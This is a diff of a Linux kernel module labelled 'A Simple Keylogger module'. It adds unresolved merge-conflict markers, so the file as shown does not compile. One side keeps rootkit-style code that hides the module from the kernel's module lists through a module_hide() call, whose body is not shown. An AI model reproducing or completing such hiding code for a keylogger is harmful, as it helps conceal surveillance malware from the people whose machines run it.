@@ -2,14 +2,18 @@
 #include <linux/kernel.h>    // included for KERN_INFO
 #include <linux/init.h>      // included for __init and __exit macros
 
+<<<<<<< HEAD
 static char module_hidden = 0;
 
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
+=======
+>>>>>>> ab4d8dc23bb672531a641dd19de9ec8c759f8d08
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("faineance");
 MODULE_DESCRIPTION("A Simple Keylogger module");
 
+<<<<<<< HEAD
 
 void module_hide(void) 
 {
@@ -43,6 +47,11 @@ static int __init hello_init(void)
 
     printk(KERN_INFO "Hello world!\n");
     module_hide();
+=======
+static int __init hello_init(void)
+{
+    printk(KERN_INFO "Hello world!\n");
+>>>>>>> ab4d8dc23bb672531a641dd19de9ec8c759f8d08
     return 0;    // Non-zero return means that the module couldn't be loaded.
 }
 
@@ -51,6 +60,9 @@ static void __exit hello_cleanup(void)
     printk(KERN_INFO "Cleaning up module.\n");
 }
 
+<<<<<<< HEAD
 
+=======
+>>>>>>> ab4d8dc23bb672531a641dd19de9ec8c759f8d08
 module_init(hello_init);
 module_exit(hello_cleanup);
